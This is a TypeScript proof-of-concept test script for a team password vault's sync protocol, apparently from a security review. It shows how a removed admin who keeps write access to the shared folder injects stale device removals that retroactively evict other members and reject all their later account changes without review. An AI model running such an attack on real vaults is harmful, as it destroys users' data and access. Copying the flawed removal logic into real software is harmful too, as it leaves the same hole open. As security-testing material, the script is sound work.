// @ts-nocheck PoC script, run as is by vaultRound4.test.ts
// S2: a removed team admin who can still write the synced team folder writes stale removals of
// uninvolved devices straight into its own log file (no agent). Removals are judged on their own
// past only, so they apply on every device, at any later time. The victims' changes since their
// remover's view are rejected retroactively and are not "caught" (no review).
// PASS = the attack step worked.
import { addDevice, agentAppend, build, check, clone, dev, found, now, open, random, rec, st, status, summary, put } from './lib';

const A = dev(); // founder admin
const B = dev(); // admin who removes X
const C = dev(); // member
const X = dev(); // admin, later removed, keeps team-folder write access
const names = { [A.deviceId]: 'A', [B.deviceId]: 'B', [C.deviceId]: 'C', [X.deviceId]: 'X' };

const v = found(A, 'team');
const id = v.vaultId;
addDevice(id, v.logs, A, B, 'admin');
addDevice(id, v.logs, A, C, 'member');
addDevice(id, v.logs, A, X, 'admin');
const stale = clone(v.logs);

const s1 = st(id, v.logs);
agentAppend(id, v.logs, [build.buildDeviceRemove(s1, B, { device: X.deviceId, currentKey: open.openVault(s1, B).currentKey, random, time: now() }).entry]);
// Months of honest work by C and A after X's removal.
const puts: any[] = [];
for (let i = 0; i < 5; i++) {
  for (const who of [C, A]) {
    const s = st(id, v.logs);
    const e = build.buildAccountPut(s, who, { account: build.newAccountId(random), record: rec(`work-${i}`), currentKey: open.openVault(s, who).currentKey, random, time: now() });
    agentAppend(id, v.logs, [e]);
    puts.push(e);
  }
}
const before = st(id, v.logs);
console.log('before', summary(before, names));

// X writes straight into log/X.jsonl (Dropbox), on its stale view: remove C, remove A.
const sX = st(id, stale);
const kX = open.openVault(sX, X).currentKey;
const rC = build.buildDeviceRemove(sX, X, { device: C.deviceId, currentKey: kX, random, time: now() });
const rA = build.buildDeviceRemove(build.afterOwnEntry(sX, rC.entry), X, { device: A.deviceId, currentKey: kX, random, time: now() });
put(v.logs, rC.entry);
put(v.logs, rA.entry);
const after = st(id, v.logs);
console.log('after ', summary(after, names));
console.log('  X removes C:', status(after, rC.entry), '| X removes A:', status(after, rA.entry));
const lost = puts.filter((e) => status(after, e).startsWith('rejected'));
const caught = after.history.filter((h: any) => h.caught).length;
check('removed X\'s stale removal of member C applies', after.members[C.deviceId]?.removed === true);
check('removed X\'s stale removal of admin A applies', after.members[A.deviceId]?.removed === true);
check(`honest account changes made after X's removal are rejected retroactively (${lost.length}/${puts.length})`, lost.length === puts.length);
check('none of them is offered for review (caught)', caught === 0);
check('accounts left in the vault', true, String(Object.keys(after.accounts).length) + ' of ' + Object.keys(before.accounts).length);
